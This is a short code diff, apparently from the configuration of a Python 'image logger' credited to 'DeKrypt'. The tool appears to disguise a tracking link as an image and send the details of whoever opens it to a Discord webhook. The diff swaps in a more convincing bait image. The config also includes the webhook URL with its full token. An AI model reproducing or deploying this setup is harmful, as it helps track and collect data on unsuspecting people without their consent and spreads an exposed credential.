@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1233981251723984926/MB4LRp8NYojURVWiN67JArs9FCAXB0myUeCpfEusM9NEbm8aZZ-t1uG8b-xOGnlW3TaX",
-    "image": "https://forums.unrealengine.com/t/dx12-editor-error-black-screen/465351", # You can also have a custom image by using a URL argument
+    "image": "https://d3kjluh73b9h9o.cloudfront.net/original/4X/b/8/1/b8183c42134524921baa2750a5308beb0f220718.jpeg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
